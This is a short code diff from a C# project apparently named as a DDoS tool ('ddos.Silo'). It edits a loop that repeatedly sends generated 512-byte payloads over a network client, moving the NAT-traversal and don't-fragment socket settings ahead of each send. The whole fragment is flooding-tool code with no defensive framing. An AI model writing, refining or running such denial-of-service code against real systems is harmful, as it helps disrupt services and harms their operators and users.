@@ -40,12 +40,12 @@ namespace ddos.Silo
                     cancellationToken.ThrowIfCancellationRequested();
 
                     var load = await _tools.CreateLoad(512);
+                    client.AllowNatTraversal(true);
+                    client.DontFragment = true;
+
                     await client.SendAsync(load, load.Length);
 
                     cancellationToken.ThrowIfCancellationRequested();
-
-                    client.AllowNatTraversal(true);
-                    client.DontFragment = true;
                 }
 
             }
